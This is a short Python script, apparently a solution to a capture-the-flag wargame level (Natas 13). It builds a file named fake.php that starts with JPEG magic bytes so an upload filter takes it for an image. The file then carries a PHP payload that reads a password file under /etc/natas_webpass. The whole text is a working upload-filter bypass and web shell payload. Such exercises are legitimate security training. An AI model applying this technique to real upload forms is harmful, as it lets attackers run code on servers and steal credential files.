jpeg_magic_numbers = b'\xFF\xD8\xFF'
 
with open("fake.php", "wb") as binary_file:
    binary_file.write(jpeg_magic_numbers)
    binary_file.write(bytes("<?php echo file_get_contents('/etc/natas_webpass/natas14'); ?>", "utf-8"))
